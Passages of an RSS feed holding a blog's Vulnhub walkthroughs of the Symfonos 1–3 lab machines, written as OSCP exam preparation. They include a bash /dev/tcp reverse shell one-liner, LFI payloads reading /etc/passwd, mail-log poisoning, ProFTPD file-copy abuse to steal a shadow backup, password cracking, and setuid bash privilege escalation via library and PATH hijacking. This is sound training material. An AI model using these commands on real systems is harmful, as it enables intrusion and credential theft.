&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;tcpdump port &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; -n -i lo -A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From the tcpdump traffic we get new credentials, hades : PTpZTfU4vxgzvRBE.&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Using the credentials we login to ssh as hades, running id reveals hades is in gods group.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Running find again reveals we have write permissions to /usr/lib/python2.7 folder.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;find / -group gods -ls 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-15.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Based on the earlier output of pspy, we saw a cronjob that was running as root and python2.7 was being executed. Therefore we can hijack
any imports in that ftpclient.py script.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-16.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since ftplib is imported, we&amp;rsquo;ll replace ftplib.py with this script&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os

os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span&gt;)
os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chmod +s /tmp/bash&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-17.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This will create a setuid bash binary in /tmp. Which can use to gain root privileges.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-18.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Symfonos 2</title>
      <link>https://blog.ikuamike.io/posts/2021/symfonos2/</link>
      <pubDate>Wed, 10 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/symfonos2/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Intermediate&lt;/td&gt;
&lt;td&gt;18 July 2019&lt;/td&gt;
&lt;td&gt;Zayotic&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;This box had quite a good number of misconfigurations and vulnerabilities. Initial access was through copying a shadow
backup file to a smb share accessible anonymously using a file copy vulnerability in proftpd. Then lateral movement
and privilege escalation was achieved by exploiting rce a locally running librenms instance and finally abusing
sudo permissions on mysql to get root.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;Nmap scan report for 192.168.191.129
Host is up (0.00028s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn&#39;t have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2021-01-25T07:02:21-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-01-25T13:02:21
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;samba-139445&#34;&gt;Samba (139/445)&lt;/h2&gt;
&lt;p&gt;Running smbmap on the target we see we can access the &lt;strong&gt;anonymous&lt;/strong&gt; share without credentials:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbmap -R -H 192.168.191.129
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/smbmap.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using smbclient to download log.txt from the anonymous share.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbclient &lt;span style=&#34;color:#ae81ff&#34;&gt;\\\\&lt;/span&gt;192.168.191.129&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;anonymous -N -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;get backups\log.txt log.txt&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From log.txt, we discover a backup of the shadow file is created in /var/backups/&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;ftp-21&#34;&gt;FTP (21)&lt;/h2&gt;
&lt;p&gt;Checking for known vulnerabilities of the proftp version using searchsploit, we find several.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The command execution exploits available rely on creating a php file on the existing webserver that would be executed.
However, the web server is running &lt;a href=&#34;https://github.com/ourway/webfsd&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;webfs&lt;/a&gt;

 which only serves static content.&lt;/p&gt;
&lt;p&gt;We can only take advantage of the file copy vulnerability. From log.txt, the smb configuration gives the location
of the anonymous share:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can exfiltrate information to the anonymous share by exploiting file copy on proftpd. Using the PoC shown here
&lt;a href=&#34;https://www.exploit-db.com/exploits/36742,&#34;&gt;https://www.exploit-db.com/exploits/36742,&lt;/a&gt; let&amp;rsquo;s get the shadow.bak file. You can either use netcat or telnet.
In this case I use netcat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -vn 192.168.191.129 &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Running smbmap command again we see that we have shadow.bak file.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;shell-as-aeolus&#34;&gt;Shell as aeolus&lt;/h2&gt;
&lt;p&gt;After downloading the shadow file from the smb we can crack it with john and rockyou wordlist.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;john --wordlist&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt shadow.bak
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using sergioteamo as the password we can access ssh as aeolus.&lt;/p&gt;
&lt;p&gt;Doing some basic manual enumeration, we see some ports listening on localhost.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;8080 would most likely be a webserver, so I&amp;rsquo;ll tunnel to it first using an ssh port forward.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -L 8000:127.0.0.1:8080 aeolus@192.168.191.129
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When we visit http://127.0.0.1:8000 on the browser, we find that LibreNMS is running here.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using searchsploit again we find two existing vulnerabilities for version 1.46.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since we can&amp;rsquo;t verify the version of librenms currently running, we&amp;rsquo;ll try the exploits and see if they work. I&amp;rsquo;ll go for the RCE.&lt;/p&gt;
&lt;p&gt;Using the exploit script provided here &lt;a href=&#34;https://www.exploit-db.com/exploits/47044,&#34;&gt;https://www.exploit-db.com/exploits/47044,&lt;/a&gt; we need to provide url, session cookies,
rhost and rport where the reverse shell will be received.&lt;/p&gt;
&lt;p&gt;Login using the earlier discovered credentials &lt;strong&gt;aeolus : sergioteamo&lt;/strong&gt;, then retrieve the cookies using burpsuite.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Run the exploit as below and catch the reverse shell using netcat.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We are now the cronus user.&lt;/p&gt;
&lt;h2 id=&#34;getting-a-root-shell&#34;&gt;Getting a root shell&lt;/h2&gt;
&lt;p&gt;Running sudo -l reveals cronus can run mysql as root with no password.&lt;/p&gt;
&lt;p&gt;Dropping into mysql as root user, we can get a root shell using the below command.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\!&lt;/span&gt; bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Symfonos 1</title>
      <link>https://blog.ikuamike.io/posts/2021/symfonos1/</link>
      <pubDate>Fri, 22 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/symfonos1/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;29 June 2019&lt;/td&gt;
&lt;td&gt;Zayotic&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;I got an OSCP voucher last year and this is my active effort to prep for it using TJ-Null&amp;rsquo;s OSCP
Prep list. Hopefully documenting this will help improve my methodology and get me ready for OSCP and beyond.&lt;/p&gt;
&lt;p&gt;In this box, initial access is through lfi to rce by using sending a payload in mail and accessing it.For privilege
escalation we exploit a setuid binary that doesn&amp;rsquo;t use absolute paths, therefore hijacking the path gives us root.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;I already have the IP of the box.&lt;/p&gt;
&lt;p&gt;Nmap output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Nmap scan report for 192.168.191.128
Host is up (0.00025s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn&#39;t have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2021-01-21T13:48:08-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-01-21T19:48:08
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;samba-139445&#34;&gt;Samba (139/445)&lt;/h2&gt;
&lt;p&gt;Using enum4linux-ng we get 2 pieces of useful information.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;enum4linux-ng.py -A 192.168.191.128:

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A user &lt;strong&gt;helios&lt;/strong&gt; is discovered&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos2.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;and the &lt;strong&gt;anonymous&lt;/strong&gt; share is accessible without credentials.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos3.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using smbclient to access the share, there is a txt file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbclient &lt;span style=&#34;color:#ae81ff&#34;&gt;\\\\&lt;/span&gt;192.168.191.128&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;anonymous -N
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos4.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Looking at the contents of attention.txt:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos5.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now we have a username and possible passwords. The combination &lt;strong&gt;helios:qwerty&lt;/strong&gt; works and we can access
the helios share.&lt;/p&gt;
&lt;p&gt;We get access to more txt files, but only the todo.txt has valuable information.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos6.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;It gives an endpoint,that we can access on the webserver.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos7.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
&lt;p&gt;When we access the endpoint we end up on a wordpress instance.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos8.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After enumeration using wpscan, 2 plugins are discovered to be vulnerable to unauthenticated LFI.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;redacted&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;mail-masta 1.0:&lt;/li&gt;
&lt;/ol&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos9.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;site-editor 1.1.1&lt;/li&gt;
&lt;/ol&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos10.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using the PoC available on exploitdb: &lt;a href=&#34;https://www.exploit-db.com/exploits/40290/&#34;&gt;https://www.exploit-db.com/exploits/40290/&lt;/a&gt; , we can craft this url
to read files such as /etc/passwd:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos11.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;getting-shell-as-helios---lfi-to-rce&#34;&gt;Getting shell as helios - LFI to RCE&lt;/h1&gt;
&lt;p&gt;A typical method to escalate to RCE using LFI is poisoning log files but I wasn&amp;rsquo;t able to load any log
file to use this method.
With the presence of port 25 we can try sending an email and try accessing the email using LFI.&lt;/p&gt;
&lt;p&gt;Sending email with payload:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos12.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Visiting the mails for user helios in /var/mail/helios gives access to the poisoned file and we can run commands.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;cmd=whoami
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos13.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now we can get a reverse shell using this payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;/bin/bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash -i &amp;gt;%26 /dev/tcp/192.168.191.1/9000 0&amp;gt;%261 %26&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Usual enumeration for privilege escalation involves looking for suid binaries by using find.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;find / -perm -4000 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary statuscheck isn&amp;rsquo;t among the linux default ones.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos14.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After running it and then running strings against it, it calls the curl command when executed.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos15.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since it doesn&amp;rsquo;t use the absolute path we can abuse this by setting our own PATH and make it call our own custom
curl command.&lt;/p&gt;
&lt;p&gt;In my custom curl script I get a copy of bash and give it suid permissions:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos16.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;rooted&#34;&gt;Rooted&lt;/h3&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos17.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;p&gt;Better way to handle the sending email part using sendEmail:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test Subject&amp;#34;&lt;/span&gt; -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test Message&amp;#34;&lt;/span&gt; -o tls&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Better suid exploit, compiling a c program that correctly sets the uid and gid as root.&lt;/p&gt;
